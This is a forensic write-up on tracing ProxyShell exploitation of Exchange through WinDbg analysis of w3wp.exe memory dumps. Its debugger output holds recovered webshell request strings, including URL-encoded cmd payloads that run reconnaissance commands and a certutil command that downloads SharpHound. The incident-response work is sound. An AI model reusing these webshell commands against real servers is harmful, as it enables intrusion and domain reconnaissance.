# Description

This section covers the process of tracking ProxyShell activity within memory dumps of the IIS Worker Process (w3wp.exe). While it's common to detect ProxyShell artifacts via IIS logs and standard event logs on disk. This write-up is used as a reference for analyzing w3wp.exe memory dumps where different debugging techniques are being leveraged, and so on. 

Understanding the importance of memory dump analysis, particularly from the w3wp.exe process on Exchange servers, is useful for attacks that involve On-Premises Exchange servers. 

We'll begin with explaining what ProxyShell is, followed by discussing key aspects of the IIS Worker Process and Application Pools, and then proceed to the memory dump analysis phase. However, keep in mind that some commands are very specific to uncovering this particular attack, and may not be applicable to other scenarios.

The following two extensions are being used during this analysis:

- **MEX**
- **SOSEX**

Please click on the 'Extensions' folder on how to get access to these two extensions. The link to these memory dumps can be found here: https://mega.nz/file/btcy3I4K#7u5q4VrswKkJ0dFkVAjMnTP7icTSjMV_wWtbDiooBhE

# What is ProxyShell?

ProxyShell is a set of vulnerabilities in Microsoft Exchange Servers that refers to a combination of three vulnerabilities that, when exploited together, allow an authenticated attacker to perform remote code execution. The following CVE's are involved within ProxyShell:

- **CVE-2021-34473** - Pre-authentication path confusion leads to ACL bypass.
- **CVE-2021-34523** - Elevation of privilege in the Exchange PowerShell backend.
- **CVE-2021-31207** - Post-authentication arbitrary file write vulnerability to perform remote code execution.

The exploit allows an attacker to bypass ACL (Access Control List) controls, elevate their privileges on the Exchange PowerShell backend, and execute arbitrary commands on the Exchange server as **NT AUTHORITY\SYSTEM**.

![image](https://github.com/DebugPrivilege/InsightEngineering/assets/63166600/9c7d7aea-5b72-4498-ac91-55bdef3b36e6)

The POC that was used execute ProxyShell: https://github.com/kh4sh3i/ProxyShell

# What is the IIS Worker Process?

Within the context of a Microsoft Exchange Server, the IIS Worker Process **(w3wp.exe)** is responsible for hosting various services that Exchange relies upon for its functionality. These services include, but are not limited to, **Outlook Web App (OWA)**, **Exchange Control Panel (ECP)**, **Autodiscover**, **ActiveSync** for mobile devices, and various API endpoints for programmatic access to mailboxes and other resources.

Each Exchange service runs in its own **Application Pool**, managed by a separate instance of **w3wp.exe**. This helps in isolating the services from each other, both for security and resource allocation. There are usually around 14 IIS Worker Processes **(w3wp.exe)** running on an Exchange server. All of them are running under the context of the **NT AUTHORITY\SYSTEM** account.

![image](https://github.com/DebugPrivilege/InsightEngineering/assets/63166600/5b65aec5-6547-4f69-ab70-1ec626bd4345)

# What is an Application Pool?

An **Application Pool** is a container that hosts specific Exchange services. Each Application Pool runs in its own worker process **(w3wp.exe)**, providing isolation and resource management for the services it hosts.

| AppPool Name                           | Description                                             |
|----------------------------------------|---------------------------------------------------------|
| `MSExchangePowerShellFrontEndAppPool`  | Handles Exchange Management Shell connections via the web. |
| `MSExchangeOABAppPool`                 | Manages Offline Address Book downloads.                 |
| `MSExchangeMapiFrontEndAppPool`        | Handles MAPI over HTTP connections to the front-end services. |
| `MSExchangeAutodiscoverAppPool`        | Manages the Autodiscover service, which helps configure client applications. |
| `MSExchangeRestAppPool`                | Handles RESTful API requests.                           |
| `MSExchangeMapiMailboxAppPool`         | Manages MAPI connections to mailboxes.                  |
| `MSExchangeECPAppPool`                 | Manages the Exchange Control Panel, part of the web-based management interface. |
| `MSExchangeSyncAppPool`                | Handles Exchange ActiveSync connections for mobile devices. |
| `MSExchangeOWAAppPool`                 | Manages Outlook Web App connections.                    |
| `MSExchangeOWACalendarAppPool`         | Handles calendar-related features in Outlook Web App.   |
| `MSExchangeRpcProxyAppPool`            | Manages the RPC Proxy service for traditional Outlook connections. |
| `MSExchangePowerShellAppPool`          | Handles PowerShell web services.                        |
| `MSExchangeServicesAppPool`            | Handles general web services for Exchange.              |
| `MSExchangeRpcProxyFrontEndAppPool`    | Manages the RPC Proxy service for front-end services.   |

Among the 14 Application Pools, **`MSExchangeOWAAppPool`** and **`MSExchangeECPAppPool`** are configured to recycle automatically every 14 days by default. This can be confirmed by running the following command:

```
C:\Windows\System32\inetsrv>appcmd list apppool "MSExchangeOWAAppPool" /text:Recycling.periodicRestart.time
14.00:00:00
```

When an Application Pool gets recycled, the associated worker process **(w3wp.exe)** is terminated and a new one is created. This action releases the memory and other system resources that were allocated to the old worker process.

The command **`appcmd list wp`** can be utilized to display all the IIS Worker Processes operating on an Exchange server, along with their Process IDs (PIDs).

![image](https://github.com/DebugPrivilege/InsightEngineering/assets/63166600/79f7359a-84a2-427f-8e41-23fca6a3c0c3)

Determining which IIS Worker Process to take a memory dump from is key when investigating this attack. The Mandiant article (https://www.mandiant.com/resources/blog/pst-want-shell-proxyshell-exploiting-microsoft-exchange-servers) indicates that ProxyShell interacts with the Exchange PowerShell Backend and writes a Webshell to the disk, so our best bet would be to take a memory dump from the **`MSExchangeOWAAppPool`** and **`MSExchangePowerShellAppPool`** Application Pool.

![image](https://github.com/DebugPrivilege/InsightEngineering/assets/63166600/90d0fe1a-5292-41c8-931a-24f1ea617b7b)

# WinDbg Walk Through - Analyzing Memory Dump

Load the Memory Dump in WinDbg:

![image](https://github.com/DebugPrivilege/InsightEngineering/assets/63166600/9b031e0c-b74a-45b3-af5f-b9a4100b4374)

Let's start with the **`!mex.di`** command which stands for dump information. This command retrieves information about the machine from which the memory dump originated. It's especially handy when working with multiple memory dumps, as it helps distinguish the analysis related to each specific dump. This is an improved version of the **`vertarget`** command.

```
0:000> !mex.di
Mex External 3.0.0.7172 Loaded!
Computer Name: EXCHANGE016
User Name: EXCHANGE016$
PID: 0x2C5C = 0n11356
Windows 10 Version 14393 MP (4 procs) Free x64
Product: Server, suite: TerminalServer DataCenter SingleUserTS
Edition build lab: 10.0.14393.5125 (rs1_release.220429-1732)
Debug session time: Mon Oct 24 23:57:22.000 2022 (UTC - 8:00)
System Uptime: 0 days 0:09:55.339
Process Uptime: 0 days 0:08:12.000
  Kernel time: 0 days 0:00:03.000
  User time: 0 days 0:00:15.000
```

Let's ensure that the memory dump is correct, since as discussed previously. There are 14 IIS Worker Process managing a different Application Pool. The command **`!peb`** in WinDbg, with the **`!extensions/mex.dll.grep`** filtering for CommandLine, outputs the command line used to start the current process. In this case, it shows that an IIS worker process (w3wp.exe) was started for the application pool **MSExchangeOWAAppPool**, which is indeed the correct one.

```
0:000> !extensions/mex.dll.grep CommandLine !peb
    CommandLine:  'c:\windows\system32\inetsrv\w3wp.exe -ap "MSExchangeOWAAppPool" -v "v4.0" -c "C:\Program Files\Microsoft\Exchange Server\V15\bin\GenericAppPoolConfigWithGCServerEnabledFalse.config" -a \\.\pipe\iisipm44c133e7-f2d7-4d86-b9fb-22286974b4bb -h "C:\inetpub\temp\apppools\MSExchangeOWAAppPool\MSExchangeOWAAppPool.config" -w "" -m 0'
```

We will start with running the **`!mex.AspxPagesExt`** command which generates a report listing all current ASP.NET requests, including details such as address, completion status, timeouts, the time elapsed, thread IDs, return codes, HTTP verbs, and URLs for each request. The presence of the GET requests already suggests suspicious activity, and from those requests. We can already observe that it's related to the ProxyShell exploitation. However, despite of this. Let's analyze further.

```
0:000> !mex.AspxPagesExt
 Address          Completed Timeout Time (secs) ThreadId ReturnCode Verb Url
 0000029c3935afb0       yes     110                             200 GET  /aspnet_client/awcqtelumpdnelor.aspx
 0000029c3ab5b838       yes     110                             200 GET  /aspnet_client/awcqtelumpdnelor.aspx?cmd=Response.Write%28%22wpvbtk%22+%2B+new+ActiveXObject%28%22WScript.Shell%22%29.Exec%28%22cmd.exe+%2Fc+whoami%22%29.StdOut.ReadAll%28%29+%2B+%22wpvbtk%22%29%3B
 0000029c3abfb6b0       yes     110                             200 GET  /owa/exhealth.check
 0000029c3ac27150       yes     110                             302 POST /OWA/auth.owa
 0000029c3acd6ae8       yes     110                             401 POST /owa/proxylogon.owa
 0000029c3acd76c8       yes     110                             302 POST /OWA/auth.owa
 0000029c3acdbeb8       yes     110                             200 GET  /owa/exhealth.check
 0000029c3ad32680       yes     110                             200 GET  /owa/default.aspx
 0000029c3ad396b8       yes     110                             401 POST /owa/proxylogon.owa
 0000029c3ad3bd48       yes     110                             241 POST /owa/proxylogon.owa
 0000029c3ad401e0       yes     110                             401 GET  /owa/
 0000029c3ad64008       yes     110                             200 POST /owa/service.svc?action=GetFolderMruConfiguration
 0000029c3afba2d0       yes     110                             200 GET  /aspnet_client/awcqtelumpdnelor.aspx?cmd=Response.Write%28%22wpvbtk%22+%2B+new+ActiveXObject%28%22WScript.Shell%22%29.Exec%28%22cmd.exe+%2Fc+ipconfig+%2Fall%22%29.StdOut.ReadAll%28%29+%2B+%22wpvbtk%22%29%3B
 0000029c3b0198a8       yes     110                             200 GET  /aspnet_client/awcqtelumpdnelor.aspx?cmd=Response.Write%28%22wpvbtk%22+%2B+new+ActiveXObject%28%22WScript.Shell%22%29.Exec%28%22cmd.exe+%2Fc+nltest+%2Fdclist%3Adc.contoso.com%22%29.StdOut.ReadAll%28%29+%2B+%22wpvbtk%22%29%3B
 0000029c3b0309f0       yes     110                             200 GET  /owa/exhealth.check
 0000029c3b03b648       yes     110                             302 POST /OWA/auth.owa
 0000029c3b06df50       yes     110                             200 GET  /owa/exhealth.check
 0000029c3b0bbf70       yes     110                             200 GET  /aspnet_client/awcqtelumpdnelor.aspx?cmd=Response.Write%28%22wpvbtk%22+%2B+new+ActiveXObject%28%22WScript.Shell%22%29.Exec%28%22cmd.exe+%2Fc+nltest+%2Fdomain_trusts%22%29.StdOut.ReadAll%28%29+%2B+%22wpvbtk%22%29%3B
 0000029c3b137f20       yes     110                             302 POST /OWA/auth.owa
 0000029c3b138f28       yes     110                             200 GET  /aspnet_client/awcqtelumpdnelor.aspx?cmd=Response.Write%28%22wpvbtk%22+%2B+new+ActiveXObject%28%22WScript.Shell%22%29.Exec%28%22cmd.exe+%2Fc+certutil.exe+-urlcache+-split+-f+https%3A%2F%2Fgithub.com%2FBloodHoundAD%2FBloodHound%2Fblob%2Fmaster%2FCollectors%2FSharpHound.exe%3Fraw%3Dtrue+C%3A%5C%5CProgramData%5C%5CSharpHound.exe%22%29.StdOut.ReadAll%28%29+%2B+%22wpvbtk%22%29%3B
20 contexts found (20 displayed).
   AS == possibly async request
   SL == session locked
```

The **`!DisplayObj`** (or **`!do2`**) command displays the structure and details of CLR objects in memory, including raw structures, array contents, static fields, and value type indexes, all referenced by the object's memory address.

This output provides a detailed view of the **`System.Web.HttpContext`** object in memory.

```
0:000> !DisplayObj 0x0000029c3ab5b838
0x0000029c3ab5b838 System.Web.HttpContext
[statics]
  0000  _asyncAppHandler                                          : NULL
  0008  _appInstance                                              : NULL
  0010  _handler                                                  : NULL
  0018  _request                                                  : 0000029c3ab5b9f8 (System.Web.HttpRequest)
  0020  _response                                                 : 0000029c3ab5bb80 (System.Web.HttpResponse)
  0028  _server                                                   : NULL
  0030  _traceContextStack                                        : NULL
  0038  _topTraceContext                                          : NULL
  0040  _items                                                    : NULL
  0048  _errors                                                   : NULL
  0050  _tempError                                                : NULL
  0058  _principalContainer                                       : 0000029c3ab5bf38 (System.Web.RootedObjects)
  0060  _Profile                                                  : NULL
  0068  _wr                                                       : 0000029c3ab5b1c8 (System.Web.Hosting.IIS7WorkerRequest)
  0070  _configurationPath                                        : NULL
  0078  _dynamicCulture                                           : 0000029c38ce78a8 (System.Globalization.CultureInfo)
  0080  _dynamicUICulture                                         : 0000029c38ce78a8 (System.Globalization.CultureInfo)
  0088  _handlerStack                                             : NULL
  0090  _pageInstrumentationService                               : NULL
  0098  _webSocketRequestedProtocols                              : NULL
  00a0  _timeoutCancellationTokenHelper                           : 0000029c39562558 (System.Web.Util.CancellationTokenHelper)
  00a8  _timeoutLink                                              : NULL
  00b0  _thread                                                   : NULL
  00b8  _configurationPathData                                    : NULL
  00c0  _filePathData                                             : 0000029c3953e960 (System.Web.CachedPathData)
  00c8  _sqlDependencyCookie                                      : NULL
  00d0  _sessionStateModule                                       : NULL
  00d8  _templateControl                                          : NULL
  00e0  _notificationContext                                      : NULL
  00e8  IndicateCompletionContext                                 : NULL
  00f0  ThreadInsideIndicateCompletion                            : NULL
  00f8  ThreadContextId                                           : 0000029c3ab5b9e0 (System.Object)
  0100  _syncContext                                              : NULL
  0108  _threadWhichStartedWebSocketTransition                    : NULL
  0110  _webSocketNegotiatedProtocol                              : NULL
  0118  _remapHandler                                             : NULL
  0120  _currentHandler                                           : NULL
  0128  <System.Web.IPrincipalContainer.Principal>k__BackingField : NULL
  0130  _rootedObjects                                            : 0000029c3ab5bf38 (System.Web.RootedObjects)
  0138  _CookielessHelper                                         : 0000029c3ab5bcd8 (System.Web.Security.CookielessHelperClass)
  0140  _timeoutStartTimeUtcTicks                                 : 638022812045100722 (System.Int64)
  0148  _timeoutTicks                                             : 1100000000 (System.Int64)
  0150  _rootedPtr                                                : 0000000000000000 (System.IntPtr)
  0158  _asyncPreloadModeFlags                                    : None (0) (System.Web.Configuration.AsyncPreloadModeFlags)
  015c  _serverExecuteDepth                                       : 0 (System.Int32)
  0160  _timeoutState                                             : 0 (System.Int32)
  0164  <SessionStateBehavior>k__BackingField                     : Default (0) (System.Web.SessionState.SessionStateBehavior)
  0168  _asyncPreloadModeFlagsSet                                 : True (System.Boolean)
  0169  _errorCleared                                             : False (System.Boolean)
  016a  _skipAuthorization                                        : False (System.Boolean)
  016b  _preventPostback                                          : False (System.Boolean)
  016c  _runtimeErrorReported                                     : False (System.Boolean)
  016d  _threadAbortOnTimeout                                     : True (System.Boolean)
  016e  _delayedSessionState                                      : False (System.Boolean)
  016f  _isAppInitialized                                         : True (System.Boolean)
  0170  _isIntegratedPipeline                                     : True (System.Boolean)
  0171  _finishPipelineRequestCalled                              : True (System.Boolean)
  0172  _impersonationEnabled                                     : False (System.Boolean)
  0173  HideRequestResponse                                       : False (System.Boolean)
  0174  InIndicateCompletion                                      : False (System.Boolean)
  0175  _webSocketTransitionState                                 : Inactive (0) (System.Web.WebSocketTransitionState)
  0176  <FirstRequest>k__BackingField                             : False (System.Boolean)
  0177  _requiresSessionStateFromHandler                          : True (System.Boolean)
  0178  _readOnlySessionStateFromHandler                          : False (System.Boolean)
  0179  InAspCompatMode                                           : False (System.Boolean)
  017a  <DisableCustomHttpEncoder>k__BackingField                 : False (System.Boolean)
  017b  _ProfileDelayLoad                                         : False (System.Boolean)
  0180  _utcTimestamp                                             : 0000029c3ab5b9c0 10/25/2022 7:53:24 AM (System.DateTime)
  0188  _requestCompletedQueue                                    : 0000029c3ab5b9c8 (System.Web.Util.SubscriptionQueue<System.Action<System.Web.HttpContext>>)
  0190  _pipelineCompletedQueue                                   : 0000029c3ab5b9d0 (System.Web.Util.SubscriptionQueue<System.IDisposable>)
```

This output shows the details of a **`System.Web.Hosting.IIS7WorkerRequest`** object, which provides information on the status and properties of an IIS worker request, such as the start time, request headers, HTTP method, content types, and various other states. Here we also can see the malicious GET request that was initiated by the ProxyShell attack:

```
0:000> !mex.DisplayObj 0x0000029c3ab5b1c8
0x0000029c3ab5b1c8 System.Web.Hosting.IIS7WorkerRequest
[statics]
  0000  _isInReadEntitySync          : False (System.Boolean)
  0008  _startTime                   : 0000029c3ab5b1d8 10/25/2022 7:53:24 AM (System.DateTime)
  0010  _traceId                     : 0000029c3ab5b1e0 00000000-0000-0000-0000-000000000000 (System.Guid)
  0020  _headerEncoding              : 0000029c38d44448 (System.Text.UTF8Encoding)
  0028  _asyncResultBase             : NULL
  0030  _appPath                     : 0000029c3ab5b7d8  "/" [1] (System.String)
  0038  _appPathTranslated           : 0000029c3ab5b7f8  "C:\inetpub\wwwroot\" [19] (System.String)
  0040  _path                        : 0000029c3ab5b5a8  "/aspnet_client/awcqtelumpdnelor.aspx" [36] (System.String)
  0048  _queryString                 : 0000029c3ab5b678  "cmd=Response.Write%28%22wpvbtk%22+%2B+ne..." [160] (System.String)
  0050  _filePath                    : 0000029c3ab5b5a8  "/aspnet_client/awcqtelumpdnelor.aspx" [36] (System.String)
  0058  _pathInfo                    : 0000029c35001420  "" [0] (System.String)
  0060  _pathTranslated              : 0000029c3ab5b500  "C:\inetpub\wwwroot\aspnet_client\awcqtel..." [54] (System.String)
  0068  _httpVerb                    : 0000029c3ab5b588  "GET" [3] (System.String)
  0070  _unknownRequestHeaders       : 0000029c3ab5d830 (System.String[][]) [Length: 0]
  0078  _knownRequestHeaders         : 0000029c3ab5d248 (System.String[]) [Length: 40]
  0080  _cachedResponseBodyBytes     : NULL
  0088  _preloadedContent            : NULL
  0090  _cacheUrl                    : 0000029c3ab5b310  "https://exchange016.contoso.com:443/aspn..." [232] (System.String)
  0098  _clientCert                  : NULL
  00a0  _clientCertPublicKey         : NULL
  00a8  _clientCertBinaryIssuer      : NULL
  00b0  _channelBindingToken         : NULL
  00b8  _disposeLockObj              : 0000029c3ab5b2f8 (System.Object)
  00c0  _clientDisconnectTokenHelper : NULL
  00c8  _allocator                   : 0000029c3953bd08 (System.Web.AllocatorProvider)
  00d0  _context                     : 0000000000000000 (System.IntPtr)
  00d8  _pCookedUrl                  : 0000000000000000 (System.IntPtr)
  00e0  _contentType                 : 0 (System.Int32)
  00e4  _contentTotalLength          : 0 (System.Int32)
  00e8  _cachedResponseBodyLength    : 0 (System.Int32)
  00ec  _preloadedLength             : 0 (System.Int32)
  00f0  _clientCertEncoding          : 0 (System.Int32)
  00f4  _rewriteNotifyDisabled       : False (System.Boolean)
  00f5  _rebaseClientPath            : False (System.Boolean)
  00f6  _requestHeadersAvailable     : True (System.Boolean)
  00f7  _preloadedLengthRead         : True (System.Boolean)
  00f8  _preloadedContentRead        : True (System.Boolean)
  00f9  _traceEnabled                : False (System.Boolean)
  00fa  _connectionClosed            : False (System.Boolean)
  00fb  _disconnected                : False (System.Boolean)
  00fc  _headersSent                 : False (System.Boolean)
  00fd  _trySkipIisCustomErrors      : False (System.Boolean)
  00fe  _clientCertFetched           : False (System.Boolean)
  0100  _traceId                     : 0000029c3ab5b2d0 00000000-0000-0000-0000-000000000000 (System.Guid)
  0110  _clientCertValidFrom         : 0000029c3ab5b2e0 1/1/0001 12:00:00 AM (System.DateTime)
  0118  _clientCertValidUntil        : 0000029c3ab5b2e8 1/1/0001 12:00:00 AM (System.DateTime)
```

This output is showing an array of known HTTP request header values associated with a particular web request where we can see a User-Agent string **`python-requests/2.28.1`**

```
0:000> !mex.DisplayObj 0x0000029c3ab5d248
[raw] 0000029c3ab5d248 System.String[] Length: 40
[01] 0000029c3ab5d560  "keep-alive" [10] (System.String)
[20] 0000029c3ab5d5e0  "*/*" [3] (System.String)
[22] 0000029c3ab5d670  "gzip, deflate" [13] (System.String)
[28] 0000029c3ab5d720  "exchange016.contoso.com" [23] (System.String)
[39] 0000029c3ab5d7e8  "python-requests/2.28.1" [22] (System.String)
```

Even though the memory dump has already confirmed the presence of ProxyShell, let's investigate further to uncover as many details as possible. Examining the ASP.NET Cache using the **`!AspNetCache`** command could provide more insights.

```
0:000> !AspNetCache
CacheItem: 0000029c35075d38
Key:       0000029c35075258  "dmachine" [8] (System.String)
Value:     0000029c35075288 (System.Web.CachedPathData)

CacheItem: 0000029c35089c40
Key:       0000029c350751f0  "dmachine/webroot" [16] (System.String)
Value:     0000029c35089c00 (System.Web.CachedPathData)

CacheItem: 0000029c3509c728
Key:       0000029c35075178  "dmachine/webroot/2" [18] (System.String)
Value:     0000029c3509c6e8 (System.Web.CachedPathData)

CacheItem: 0000029c3509eae8
Key:       0000029c350750f0  "dmachine/webroot/2/owa" [22] (System.String)
Value:     0000029c3509eaa8 (System.Web.CachedPathData)

CacheItem: 0000029c3591cb98
Key:       0000029c3591c0b8  "dmachine" [8] (System.String)
Value:     0000029c3591c0e8 (System.Web.CachedPathData)

CacheItem: 0000029c35931450
Key:       0000029c3591c050  "dmachine/webroot" [16] (System.String)
Value:     0000029c35931410 (System.Web.CachedPathData)

CacheItem: 0000029c359442f0
Key:       0000029c3591bfd8  "dmachine/webroot/1" [18] (System.String)
Value:     0000029c359442b0 (System.Web.CachedPathData)

CacheItem: 0000029c35947000
Key:       0000029c3591bf50  "dmachine/webroot/1/owa" [22] (System.String)
Value:     0000029c35946fc0 (System.Web.CachedPathData)

CacheItem: 0000029c3837f400
Key:       0000029c3915a2b8  "dmachine" [8] (System.String)
Value:     0000029c3837e950 (System.Web.CachedPathData)

CacheItem: 0000029c3890fdb0
Key:       0000029c3915a1d8  "dmachine/webroot/1" [18] (System.String)
Value:     0000029c3890fd70 (System.Web.CachedPathData)

CacheItem: 0000029c38d20370
Key:       0000029c3915a250  "dmachine/webroot" [16] (System.String)
Value:     0000029c38d20330 (System.Web.CachedPathData)

CacheItem: 0000029c38d5fce8
Key:       0000029c38d5fca8  "yapp_web_umn3lblq" [17] (System.String)
Value:     0000029c38d5f958 (System.Reflection.RuntimeAssembly)

CacheItem: 0000029c38d60188
Key:       0000029c38d60100  "cdefault.aspx.cdcab7d2" [22] (System.String)
Value:     0000029c38d4e308 (System.Web.Compilation.BuildResultCompiledTemplateType)

CacheItem: 0000029c391534b0
Key:       0000029c395576a0  "xWebevent_msg_RuntimeErrorUnhandledExcep..." [44] (System.String)
Value:     0000029c39557e88  "An unhandled exception has occurred." [36] (System.String)

CacheItem: 0000029c3ab18720
Key:       0000029c3ab18688  "yapp_web_k5dbkl5f" [17] (System.String)
Value:     0000029c3ab164d0 (System.Reflection.RuntimeAssembly)

CacheItem: 0000029c3ab18d08
Key:       0000029c3ab18c38  "cawcqtelumpdnelor.aspx.898219ba" [31] (System.String)
Value:     0000029c3ab16ef8 (System.Web.Compilation.BuildResultCompiledTemplateType)

CacheItem: 0000029c3b06f3d0
Key:       0000029c3b06f310  "f1/aspnet_client" [16] (System.String)
Value:     0000029c3b06f370 (System.Web.Configuration.MapPathCacheInfo)

CacheItem: 0000029c3b0711c8
Key:       0000029c3b06f000  "dmachine/webroot/1/aspnet_client" [32] (System.String)
Value:     0000029c3b071150 (System.Web.CachedPathData)

CacheItem: 0000029c3b077258
Key:       0000029c3b077170  "f1/aspnet_client/awcqtelumpdnelor.aspx" [38] (System.String)
Value:     0000029c3b0771f8 (System.Web.Configuration.MapPathCacheInfo)

CacheItem: 0000029c3b077c40
Key:       0000029c3b06ef00  "dmachine/webroot/1/aspnet_client/awcqtel..." [54] (System.String)
Value:     0000029c3b077bc8 (System.Web.CachedPathData)

CacheItem: 0000029c3b0a59d8
Key:       0000029c3b0a5950  "z1397098540" [11] (System.String)
Value:     0000029c3b0a1cf0 (System.Web.Mobile.MobileCapabilities)

CacheItem: 0000029c3b0a7438
Key:       0000029c3b082058  "e1python-requests/2.28.1" [24] (System.String)
Value:     0000029c3b0a1cf0 (System.Web.Mobile.MobileCapabilities)

CacheItem: 0000029c3b16d180
Key:       0000029c3b16d0b8  "f2/owa/exhealth.check" [21] (System.String)
Value:     0000029c3b16d120 (System.Web.Configuration.MapPathCacheInfo)

CacheItem: 0000029c3b16dc08
Key:       0000029c3b16db60  "f2/owa" [6] (System.String)
Value:     0000029c3b16dba8 (System.Web.Configuration.MapPathCacheInfo)

CacheItem: 0000029c3b16dd18
Key:       0000029c3b16dc78  "f2/" [3] (System.String)
Value:     0000029c3b16dcb8 (System.Web.Configuration.MapPathCacheInfo)

CacheItem: 0000029c3b170258
Key:       0000029c3b16cd10  "dmachine/webroot/2/owa/exhealth.check" [37] (System.String)
Value:     0000029c3b1701e0 (System.Web.CachedPathData)

CacheItem: 0000029c3b17f068
Key:       0000029c3b17efb0  "f1/owa/auth.owa" [15] (System.String)
Value:     0000029c3b17f008 (System.Web.Configuration.MapPathCacheInfo)

CacheItem: 0000029c3b180bd8
Key:       0000029c3b180b18  "f1/owa" [6] (System.String)
Value:     0000029c3b180b60 (System.Web.Configuration.MapPathCacheInfo)

CacheItem: 0000029c3b182688
Key:       0000029c3b1825e8  "f1/" [3] (System.String)
Value:     0000029c3b182628 (System.Web.Configuration.MapPathCacheInfo)

CacheItem: 0000029c3b183928
Key:       0000029c3b17ec28  "dmachine/webroot/1/owa/auth.owa" [31] (System.String)
Value:     0000029c3b1838b0 (System.Web.CachedPathData)

CacheItem: 0000029c3b1b7088
Key:       0000029c3b1b7000  "z1397098540" [11] (System.String)
Value:     0000029c3b1b33a0 (System.Web.Mobile.MobileCapabilities)

CacheItem: 0000029c3b1b7130
Key:       0000029c3b1939f0  "e1AMProbe/Local/ClientAccess" [28] (System.String)
Value:     0000029c3b1b33a0 (System.Web.Mobile.MobileCapabilities)
```

The **`System.Reflection.RuntimeAssembly`** object represents a loaded .NET assembly in the application's memory, which has been added to the ASP.NET Cache. I'd believe this might be done to improve performance by storing assemblies or other frequently accessed objects in memory to avoid re-loading or re-creation. 

.NET assemblies typically contain the compiled code of a .NET application, which means that it can also contain code of a Webshell.

```
0:052> !mex.DisplayObj 0x0000029c3ab18720
0x0000029c3ab18720 System.Web.Caching.CacheEntry
[statics]
  0000  _key               : 0000029c3ab18688  "yapp_web_k5dbkl5f" [17] (System.String)
  0008  _hashCode          : 1410980836 (System.Int32)
  000c  _bits              : 2 (System.Byte)
  000d  _expiresBucket     : 255 (System.Byte)
  000e  _usageBucket       : 255 (System.Byte)
  0010  _value             : 0000029c3ab164d0 (System.Reflection.RuntimeAssembly)
  0018  _cache             : 0000029c38d2fe00 (System.Web.Caching.CacheMultiple)
  0020  _dependency        : NULL
  0028  _onRemovedTargets  : 0000029c3ab18888 (System.Web.Caching.CacheDependency)
  0030  _utcCreated        : 0000029c3ab18758 10/25/2022 7:53:22 AM (System.DateTime)
  0038  _utcExpires        : 0000029c3ab18760 12/31/9999 11:59:59 PM (System.DateTime)
  0040  _slidingExpiration : 0000029c3ab18768 00:00:00 (System.TimeSpan)
  0048  _expiresEntryRef   : 0000029c3ab18770 (System.Web.Caching.ExpiresEntryRef)
  0050  _usageEntryRef     : 0000029c3ab18778 (System.Web.Caching.UsageEntryRef)
  0058  _utcLastUpdate     : 0000029c3ab18780 10/25/2022 7:53:22 AM (System.DateTime)
```

This output displays the properties of a **`System.Reflection.RuntimeAssembly`** object that represents a dynamically compiled assembly with the name **`App_Web_k5dbkl5f`**

```
0:052> !mex.DisplayObj 0x0000029c3ab164d0
0x0000029c3ab164d0 System.Reflection.RuntimeAssembly
[statics]
  0000  _ModuleResolve : NULL
  0008  m_fullname     : 0000029c3ab20b68  "App_Web_k5dbkl5f, Version=0.0.0.0, Cultu..." [71] (System.String)
  0010  m_syncRoot     : NULL
  0018  m_assembly     : 0000029c57400fd0 (System.IntPtr)
```

Are there any other suspicious .NET assemblies? Well, let's figure out. This command uses the **`!Mex.grep`** utility to filter and display information related to "App_Web" within the properties of **`System.Reflection.RuntimeAssembly`** objects, and the **`!ForEachObject`** iterates through each instance of RuntimeAssembly in memory, applying the **`!do2`** command to dump information.

```
0:052> !Mex.grep -A 5 "App_Web" !ForEachObject -s -x "!do2 @#Obj" System.Reflection.RuntimeAssembly
  0008  m_fullname     : 0000029c3ab20b68  "App_Web_k5dbkl5f, Version=0.0.0.0, Cultu..." [71] (System.String)
  0010  m_syncRoot     : NULL
  0018  m_assembly     : 0000029c57400fd0 (System.IntPtr)
  0020  m_flags        : ASSEMBLY_FLAGS_UNKNOWN (0) (System.Reflection.RuntimeAssembly+ASSEMBLY_FLAGS)
--------------------------------------------------------------------------------
```

The .NET Assembly **`App_Web_k5dbkl5f`** happens to be related to the Webshell that is written to disk when executing ProxyShell. We can identify this through the strings. This command searches the memory for instances of **`App_Web_k5dbkl5f`** and for each match, it prints the location and dumps 120 bytes of memory from that address.

```
0:000> .foreach (address { s -[l 8]a 0 L?0x7fffffffffffffff "App_Web_k5dbkl5f" }) { .if ($spat("${address}", "0000*`*")) { .echo Found "App_Web_k5dbkl5f" at ${address}; dc ${address} L30 } }
Found "App_Web_k5dbkl5f" at 0000029c`3ab1a7cd
0000029c`3ab1a7cd  5f707041 5f626557 6264356b 66356c6b  App_Web_k5dbkl5f
0000029c`3ab1a7dd  79742022 223d6570 2e505341 6e707361  " type="ASP.aspn
0000029c`3ab1a7ed  635f7465 6e65696c 77615f74 65747163  et_client_awcqte
0000029c`3ab1a7fd  706d756c 6c656e64 615f726f 22787073  lumpdnelor_aspx"
0000029c`3ab1a80d  200a0d3e 3c202020 656c6966 73706564  >..    <filedeps
0000029c`3ab1a81d  200a0d3e 20202020 3c202020 656c6966  >..        <file
0000029c`3ab1a82d  20706564 656d616e 612f223d 656e7073  dep name="/aspne
0000029c`3ab1a83d  6c635f74 746e6569 6377612f 6c657471  t_client/awcqtel
0000029c`3ab1a84d  64706d75 6f6c656e 73612e72 20227870  umpdnelor.aspx" 
0000029c`3ab1a85d  0a0d3e2f 20202020 69662f3c 6564656c  />..    </filede
0000029c`3ab1a86d  0d3e7370 702f3c0a 65736572 3e657672  ps>..</preserve>
0000029c`3ab1a87d  00000000 00000000 00000000 00000000  ................

<<< SNIPPET >>>
```

Unfortunately this .NET assembly is not present within memory anymore, but if it was. We could potentially extract the code of the Webshell that was dropped on disk.

```
0:000> !lmi App_Web_k5dbkl5f
Loaded Module Info: [app_web_k5dbkl5f] 
app_web_k5dbkl5f not found
```

# WinDbg Walk Through - MSExchangeOWAAppPool

Open the **`MSExchangeOWAAppPool`** Application Pool's Memory Dump in WinDbg.

![image](https://github.com/DebugPrivilege/InsightEngineering/assets/63166600/4b0a0ba1-7594-4de5-9e90-e0a667bb54d7)

Let's start with the **`!mex.di`** command which stands for dump information. This command retrieves information about the machine from which the memory dump originated. It's especially handy when working with multiple memory dumps, as it helps distinguish the analysis related to each specific dump. This is an improved version of the **`vertarget`** command.

```
0:000> !mex.di
Mex External 3.0.0.7172 Loaded!
Computer Name: EXCHANGE2012
User Name: EXCHANGE2012$
PID: 0x1AB0 = 0n6832
Windows 10 Version 14393 MP (4 procs) Free x64
Product: Server, suite: TerminalServer SingleUserTS
Edition build lab: 10.0.14393.2097 (rs1_release_1.180212-1105)
